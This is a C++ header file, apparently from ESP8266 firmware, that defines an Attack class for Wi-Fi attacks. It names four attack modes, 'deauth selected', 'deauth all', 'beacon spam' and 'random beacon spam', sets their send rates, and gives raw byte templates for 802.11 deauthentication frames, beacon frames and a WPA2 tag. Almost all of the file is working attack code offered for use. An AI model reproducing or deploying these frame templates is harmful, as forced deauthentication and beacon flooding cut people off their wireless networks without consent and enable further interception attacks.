#ifndef Attack_h
#define Attack_h

#include "ESP8266WiFi.h"

extern "C" {
  #include "user_interface.h"
}

#include "Mac.h"
#include "MacList.h"
#include "APScan.h"
#include "ClientScan.h"

#define attackNum 4 //number of defined attacks

#define deauthsPerSecond 10 //number of deauthentication & disassociation frames sent per second per target.

#define beaconPerSecond 10 //number of beacon frames sent per second
#define randomBeacons 80 //number of generated beacon frames
#define SSIDLen 32 //SSID length of random generated APs (random beacon spam)
#define randomBeaconChange 3 //time in seconds after new beacon frames are generated
#define beaconChannel 10 //channel to send beacon frames on (only for the packet bytes, it will actually sent on the current channel)

extern void PrintHex8(uint8_t *data, uint8_t length);
extern void getRandomVendorMac(uint8_t *buf);
extern String data_getVendor(uint8_t first,uint8_t second,uint8_t third);

extern APScan apScan;
extern ClientScan clientScan;

class Attack
{
  public:
    Attack();
    void generate(int num);
    void start(int num);
    String getResults();
    void run();
    void stopAll();
    void stop(int num);
  private:
    void generateBeaconPacket();
    bool send(uint8_t buf[], int len);
    
    const String attackNames[attackNum] = {"deauth selected","deauth all","beacon spam","random beacon spam"};
    String stati[attackNum];
    int packetsCounter[attackNum];
    bool running[attackNum];

    unsigned long previousMillis[attackNum];
    unsigned long previousSecond[attackNum];
    unsigned long previousRandomBeaconMillis;
    unsigned long currentMillis = 0;

    
    uint8_t deauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
      /*  4 - 9  */ 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB,//reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
      /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
    };
    

    uint8_t beaconSSIDs[randomBeacons][SSIDLen];
    uint8_t beaconMACs[randomBeacons][6];
    //uint8_t beaconChannels[randomBeacons];

    uint8_t beaconNumbers[randomBeacons];
    
    uint8_t packet[128];
    int packetSize;
    
    int randomBeaconCounter = 0;
    int oldRandomBeacon = 0; //first beacon to regenerated after >>randomBeaconChange<< seconds
    
    uint8_t beaconPacket_header[36] = { 
                0x80, 0x00, 
                0x00, 0x00, //beacon
                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, //destination: broadcast
                0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
                0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //source
                0xc0, 0x6c, 
                0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, 
                0x64, 0x00, 
                0x01, 0x04/*, 
                0x00, 0x06, //SSID size
                0x72, 0x72, 0x72, 0x72, 0x72, 0x72, //SSID
                >>beaconPacket_end<<
                0x04 //channel*/
    };

    uint8_t beaconPacket_end[13] = {
      0x01, 0x08, 0x82, 0x84,
      0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01,
      beaconChannel //channel  
    };

    uint8_t beaconWPA2tag[26] = {
      0x30, //RSN tag
      0x18, //tag length
      0x01, 0x00, //RSN version
      0x00, 0x0f, 0xac, 0x02, //cipher (TKIP)
      0x02, 0x00, //pair cipher
      0x00, 0x0f, 0xac, 0x04, //cipher (AES)
      0x00, 0x0f, 0xac, 0x02, //cipher (TKIP)
      0x01, 0x00, //AKM count
      0x00, 0x0f, 0xac, 0x02, //PSK
      0x00, 0x00 //RSN capabilities
    };
};

#endif
